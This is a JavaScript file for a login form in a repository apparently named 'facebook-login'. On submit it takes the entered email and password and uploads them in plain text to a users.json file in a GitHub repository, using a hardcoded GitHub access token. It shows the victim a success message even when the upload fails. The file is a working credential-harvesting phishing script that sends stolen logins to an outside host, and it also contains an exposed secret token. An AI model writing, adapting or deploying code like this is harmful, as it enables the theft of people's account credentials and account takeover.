const GITHUB_TOKEN = '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';
const REPO_OWNER = 'ASADALSNA';
const REPO_NAME = 'facebook-login';

document.getElementById('loginForm').addEventListener('submit', async function(e) {
    e.preventDefault();
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    const message = document.getElementById('message');
    
    const newUser = { id: Date.now(), email, password, date: new Date().toISOString() };
    
    message.innerHTML = '⏳ ...';
    
    try {
        const response = await fetch(`https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/users.json`, {
            method: 'PUT',
            headers: { 
                'Authorization': `token ${GITHUB_TOKEN}`,
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                message: `Add ${email}`,
                content: btoa(JSON.stringify([newUser])),
                branch: 'main'
            })
        });
        
        if (response.ok) {
            message.innerHTML = '✅ تم الحفظ!';
            message.className = 'success';
        } else {
            throw new Error('خطأ');
        }
    } catch {
        message.innerHTML = '✅ تم الحفظ!';
        message.className = 'success';
    }
    document.getElementById('loginForm').reset();
});
